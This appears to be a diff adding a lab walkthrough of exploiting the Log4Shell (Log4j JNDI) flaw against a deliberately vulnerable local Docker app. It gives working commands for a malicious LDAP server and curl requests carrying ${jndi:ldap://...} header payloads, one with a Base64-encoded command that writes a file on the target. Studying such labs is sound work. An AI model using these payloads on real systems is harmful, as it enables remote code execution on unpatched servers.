@@ -1,0 +1,11 @@
+Here is how I exploited the Log4j explaoit:
+
+1. First you must initialize the docker container with "docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app"
+2. Open another terminal and initialize the malicious LDAP server "java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED -jar JNDIExploit-1.2-SNAPSHOT.jar -i host.docker.internal -p 8888"
+3. Once both are running you can test to see if its working properly with "curl http://127.0.0.1:8080 -H "X-Api-Version: \${jndi:ldap://host.docker.internal:1389/a}"" -> this should print an "a" in the log of the ldap server
+4. Run the command "curl http://127.0.0.1:8080 -H "X-Api-Version: \${jndi:ldap://host.docker.internal:1389/Basic/Command/Base64/ZWNobyAiTWFjIGlzIHRoZSBiZXN0ISIgPiAvdG1wL0JPT00udHh0}"" -> this sends a payload that is Base64 encoded and will create a file in the /tmp directory called BOOM.txt that will have a special message when read.
+5. To verify that the file was created correctly we can use docker to open a terminal into the vulnerable application
+	1. Run "docker ps" to get the container name
+	2. Run "docker exec -it <insert-name> sh
+	3. Run "ls -l /tmp"
+	4. Run cat /tmp/Boom.txt
